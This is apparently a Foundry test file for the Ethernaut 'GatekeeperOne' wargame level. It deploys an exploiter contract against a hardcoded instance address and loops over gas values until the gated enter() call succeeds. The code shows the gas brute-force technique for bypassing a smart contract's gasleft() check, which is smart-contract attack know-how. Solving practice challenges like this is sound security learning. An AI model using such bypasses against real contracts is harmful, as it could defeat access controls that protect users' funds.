// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

import "../src/13-GatekeeperOne.sol";

contract GatekeeperOneTest is Test {
    GatekeeperOne public exploiter = new GatekeeperOne(0x828d3D011f609fBca906582755A81f9c78Ec1613);

    function setUp() public {}

    function test_enter() public {
        bool passed;
        for (uint256 i = 0; i < 8191; i++) {
            try exploiter.enter(100000 + i) {
                passed = true;
                console.log("Success with gas ", 100000 + i);
                break;
            } catch {}
        }
        assert(passed);
    }
}
